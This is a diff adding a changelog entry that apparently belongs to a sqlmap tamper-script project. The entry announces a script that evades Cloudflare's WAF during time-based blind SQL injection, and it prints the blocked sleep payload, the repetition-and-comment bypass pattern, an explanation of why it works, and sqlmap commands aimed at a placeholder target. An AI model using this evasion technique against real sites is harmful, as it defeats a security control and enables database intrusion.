@@ -6,6 +6,31 @@
 
 ---
 
+## [2.1.0] - 2026-02-24 - Cloudflare 403 Bypass
+
+### New Tamper Script
+
+**cloudflarebypas.py** - Bypasses Cloudflare 403 for time-based blind SQLi
+
+**Technique:**
+- Original payload blocked: `(select(0)from(select(sleep(10)))v)` → 403
+- Bypass: Repeat payload with comments and escape sequences
+- `payload/*'+payload+'\"+payload`
+
+**How it works:**
+- Comments `/*'` break WAF regex patterns
+- Escaped quotes `\'` and `\"` confuse the parser
+- Triple repetition makes the pattern unrecognizable
+
+**Usage:**
+```bash
+sqlmap -u "http://target.com/?id=1" --tamper=cloudflarebypas
+# Or automatically with:
+sqlmap -u "http://target.com/?id=1" --waf-bypass=cloudflare
+```
+
+---
+
 ## [2.0.0] - 2026-02-24 - Smart WAF Detection
 
 ### Major Refactor
